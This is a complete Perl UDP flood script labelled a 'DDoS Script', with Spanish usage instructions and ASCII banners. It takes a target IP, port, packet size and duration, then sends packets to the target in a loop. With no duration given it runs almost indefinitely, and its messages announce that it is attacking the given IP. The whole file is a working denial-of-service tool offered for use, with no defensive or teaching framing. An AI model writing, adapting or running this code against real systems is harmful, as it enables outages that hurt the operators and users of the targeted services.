#!/usr/bin/perl
 
# DDoS Script made by https://github.com/zBlxxded/
 
use Socket;
use strict;

if ($#ARGV != 3) {
  print "\n██████╗ ██╗     ██╗  ██╗██╗  ██╗██████╗     ██████╗ ██████╗  ██████╗ ███████╗\n██╔══██╗██║     ╚██╗██╔╝╚██╗██╔╝██╔══██╗    ██╔══██╗██╔══██╗██╔═══██╗██╔════╝\n██████╔╝██║      ╚███╔╝  ╚███╔╝ ██║  ██║    ██║  ██║██║  ██║██║   ██║███████╗\n██╔══██╗██║      ██╔██╗  ██╔██╗ ██║  ██║    ██║  ██║██║  ██║██║   ██║╚════██║\n██████╔╝███████╗██╔╝ ██╗██╔╝ ██╗██████╔╝    ██████╔╝██████╔╝╚██████╔╝███████║\n╚═════╝ ╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝     ╚═════╝ ╚═════╝  ╚═════╝ ╚══════╝";
  print "\n\n» Uso correcto: perl BlxxdDDoS-esp.pl [IP] [Puerto] [Paquetes] [Tiempo]\n\n ";
  print "» Puerto: Usar puerto aleatorio entre 1 y 65535.\n";
  print "» Paquetes: Usar entre 64 y 1024 paquetes aleatorios.\n";
  print "» Tiempo: En segundos.\n\n";
  print "» Ejemplo: perl BlxxdDDoS.pl 0.0.0.0 80 100 30\n\n";
  exit(1);
}

my ($ip,$port,$size,$time) = @ARGV;

my ($iaddr,$endtime,$psize,$pport);

$iaddr = inet_aton("$ip") or die "\n██████╗ ██╗     ██╗  ██╗██╗  ██╗██████╗     ██████╗ ██████╗  ██████╗ ███████╗\n██╔══██╗██║     ╚██╗██╔╝╚██╗██╔╝██╔══██╗    ██╔══██╗██╔══██╗██╔═══██╗██╔════╝\n██████╔╝██║      ╚███╔╝  ╚███╔╝ ██║  ██║    ██║  ██║██║  ██║██║   ██║███████╗\n██╔══██╗██║      ██╔██╗  ██╔██╗ ██║  ██║    ██║  ██║██║  ██║██║   ██║╚════██║\n██████╔╝███████╗██╔╝ ██╗██╔╝ ██╗██████╔╝    ██████╔╝██████╔╝╚██████╔╝███████║\n╚═════╝ ╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝     ╚═════╝ ╚═════╝  ╚═════╝ ╚══════╝\n\nBlxxdDDoS » ¡ERROR! · La IP proporcionada es inválida: $ip\n\n";
$endtime = time() + ($time ? $time : 1000000);

socket(flood, PF_INET, SOCK_DGRAM, 17);

print "\n██████╗ ██╗     ██╗  ██╗██╗  ██╗██████╗     ██████╗ ██████╗  ██████╗ ███████╗\n██╔══██╗██║     ╚██╗██╔╝╚██╗██╔╝██╔══██╗    ██╔══██╗██╔══██╗██╔═══██╗██╔════╝\n██████╔╝██║      ╚███╔╝  ╚███╔╝ ██║  ██║    ██║  ██║██║  ██║██║   ██║███████╗\n██╔══██╗██║      ██╔██╗  ██╔██╗ ██║  ██║    ██║  ██║██║  ██║██║   ██║╚════██║\n██████╔╝███████╗██╔╝ ██╗██╔╝ ██╗██████╔╝    ██████╔╝██████╔╝╚██████╔╝███████║\n╚═════╝ ╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝     ╚═════╝ ╚═════╝  ╚═════╝ ╚══════╝\n\nBlxxdDDoS » Atacando IP $ip al puerto " . ($port ? $port : "random") . " con " .
  ($size ? "$size bytes" : "random size") . " de paquetes" .
  ($time ? " durante $time segundo(s)" : "") . "\n";
print "BlxxdDDoS » Para detener el ataque usa las teclas [Ctrl + C]\n" unless $time;

for (;time() <= $endtime;) {
  $psize = $size ? $size : int(rand(1024-64)+64) ;
  $pport = $port ? $port : int(rand(65500))+1;
  send(flood, pack("a$psize","flood"), 0, pack_sockaddr_in($pport, $iaddr));}
